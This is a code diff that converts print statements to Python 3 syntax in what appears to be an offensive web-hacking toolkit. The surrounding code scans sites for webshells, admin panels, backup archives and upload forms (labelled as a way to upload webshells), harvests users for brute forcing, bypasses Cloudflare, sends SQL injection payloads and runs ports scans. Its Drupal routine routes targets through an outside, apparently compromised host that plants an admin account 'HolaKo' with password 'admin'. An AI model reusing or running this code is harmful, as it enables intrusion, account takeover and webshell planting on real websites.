@@ -1191,9 +1191,9 @@ def grabuploadedlink(url):
         for dir in directories:
             currentcode = urllib.urlopen(url + dir).getcode()
             if currentcode == 200 or currentcode == 403:
-                print "-------------------------"
-                print "  [ + ] Found Directory:  " + str(url + dir) + " [ + ]"
-                print "-------------------------"
+                print("-------------------------")
+                print("  [ + ] Found Directory:  " + str(url + dir) + " [ + ]")
+                print("-------------------------")
                 upload.append(url + dir)
     except:
         pass
@@ -1205,10 +1205,10 @@ def grabshell(url):
             for shell in shells:
                 currentcode = urllib.urlopen(upl + shell).getcode()
                 if currentcode == 200:
-                    print "-------------------------"
-                    print "  [ ! ] Found Shell:  " + \
-                        str(upl + shell) + " [ ! ]"
-                    print "-------------------------"
+                    print("-------------------------")
+                    print("  [ ! ] Found Shell:  " + \
+                        str(upl + shell) + " [ ! ]")
+                    print("-------------------------")
     except:
         pass
 
@@ -1503,7 +1503,7 @@ class Fscan:
         the attacker may do a lot of vulnerability
         tests on the admin area
         '''
-        print "[~] Finding admin panels"
+        print ("[~] Finding admin panels")
         adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/',
                      'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
         clearScr()
@@ -1511,7 +1511,7 @@ class Fscan:
             for admin in adminList:
                 try:
                     if urllib.urlopen(site + admin).getcode() == 200:
-                        print " [*] Found admin panel -> ", site + admin
+                        print(" [*] Found admin panel -> ", site + admin)
                 except IOError:
                     pass
  ############################
@@ -1525,12 +1525,12 @@ class Fscan:
         zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar',
                    'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
         clearScr()
-        print "[~] Finding zip file"
+        print("[~] Finding zip file")
         for site in self.sites:
             for zip1 in zipList:
                 try:
                     if urllib.urlopen(site + zip1).getcode() == 200:
-                        print " [*] Found zip file -> ", site + zip1
+                        print(" [*] Found zip file -> ", site + zip1)
                 except IOError:
                     pass
 
@@ -1543,7 +1543,7 @@ class Fscan:
         upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php', 'blog/up.php', 'upload.php',
                   'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
         clearScr()
-        print "[~] Finding Upload"
+        print("[~] Finding Upload Forms to Upload Webshells")
         for site in self.sites:
             for up in upList:
                 try:
@@ -1551,7 +1551,7 @@ class Fscan:
                         html = urllib.urlopen(site + up).readlines()
                         for line in html:
                             if re.findall('type=file', line):
-                                print " [*] Found upload -> ", site + up
+                                print(" [*] Found upload -> ", site + up)
                 except IOError:
                     pass
 
@@ -1564,7 +1564,7 @@ class Fscan:
         (you can use medusa or hydra)
         '''
         clearScr()
-        print "[~] Grabbing Users"
+        print("[~] Grabbing Users")
         userslist = []
         for site1 in self.sites:
             try:
@@ -1600,7 +1600,7 @@ class Fscan:
         method from a guy in madleets
         '''
         clearScr()
-        print "[~] Bypassing cloudflare"
+        print("[~] Bypassing cloudflare")
         subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
         for site in self.sites:
             site.replace('http://', '')
@@ -1667,7 +1667,7 @@ class Fscan:
         tool in my blog
         '''
         clearScr()
-        print "[~] Checking SQL injection"
+        print ("[~] Checking SQL injection")
         payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                     "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
         check = re.compile(
@@ -1693,7 +1693,7 @@ class Fscan:
         or with common ports (al-swisre idea)
         '''
         clearScr()
-        print "[~] Scanning Ports"
+        print ("[~] Scanning Ports")
 
         if mode == 1:
             a = ran.split('-')
@@ -1711,7 +1711,7 @@ def do_it(ip, port):
 
     sock = sock.connect_ex((ip, port))
     if sock == 0:
-        print " [*] Port %i is open" % port
+        print (" [*] Port %i is open" % port)
 
 
 ############################
@@ -1744,19 +1744,19 @@ def drupal():
                 urlpa = urlparse(url)
                 site = urlpa.netloc
 
-                print "[+] Testing At " + site
+                print ("[+] Testing At " + site)
                 resp = urllib2.urlopen(
                     'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                 read = resp.read()
                 if "User: HolaKo" in read:
-                    print "Exploit found =>" + site
+                    print("Exploit found =>" + site)
 
-                    print "user:HolaKo\npass:admin"
+                    print("user:HolaKo\npass:admin")
                     a = open('up.txt', 'a')
                     a.write(site + '\n')
                     a.write("user:" + user + "\npass:" + pwd + "\n")
                 else:
-                    print "[-] Expl Not Found:( "
+                    print ("[-] Expl Not Found:( ")
 
             except Exception as ex:
                 print ex
@@ -1800,8 +1800,8 @@ def drupallist():
                 'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
             readcontent = openurl.read()
             if "Success" in readcontent:
-                print "[+]Success =>" + url
-                print "[-]username:HolaKo\n[-]password:admin"
+                print("[+]Success =>" + url)
+                print("[-]username:HolaKo\n[-]password:admin")
                 save = open('drupal.txt', 'a')
                 save.write(
                     url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")
